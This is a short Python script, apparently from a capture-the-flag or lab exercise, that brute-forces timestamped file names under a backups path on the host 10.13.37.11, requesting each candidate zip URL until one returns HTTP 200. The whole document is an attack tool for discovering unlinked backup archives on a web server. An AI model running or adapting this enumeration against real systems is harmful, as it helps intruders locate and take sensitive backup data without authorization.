import requests
import sys
from tqdm import tqdm

time = 133000

def progress():
  while time < 140000:
    yield
for _ in tqdm(progress()):
	time = time + 1
	bf = str(time)
	url = (f"http://10.13.37.11/backups/backup_20221123" + bf + ".zip")
	response = requests.get(url)

	if response.status_code==200:
		print("  !!! Backup file: " + url)
		sys.exit()
